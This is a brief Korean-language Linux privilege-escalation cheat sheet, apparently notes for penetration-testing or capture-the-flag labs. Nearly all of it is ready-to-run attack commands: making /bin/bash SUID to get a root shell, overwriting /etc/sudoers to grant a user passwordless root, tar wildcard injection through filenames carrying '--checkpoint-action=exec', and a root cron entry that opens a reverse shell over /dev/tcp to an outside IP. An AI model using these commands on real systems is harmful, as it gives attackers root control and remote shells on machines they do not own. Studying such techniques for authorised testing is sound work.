### Bash u+s
```bash
# SUID 권한 부여
chmod u+s /bin/bash
# 모두가 p 권한으로 root 쉘 접근 가능
/bin/bash -p
```

### sudoers 추가
```bash
echo 'cassie ALL=(root) NOPASSWD: ALL' > /etc/sudoers
```

### tar wildcard
```bash
# tar -zcf /home/backup.tgz * 와 같이 wildcard를 쓸 경우

echo "" > '--checkpoint=1'  
echo "" > '--checkpoint-action=exec=sh privesc.sh'
```

### cron 업로드
```bash
* * * * * bash -c 'bash -i >& /dev/tcp/10.10.14.8/9001 0>&1'
```
위 파일을 아래 경로에 업로드
```bash
/var/spool/cron/crontabs/root
```



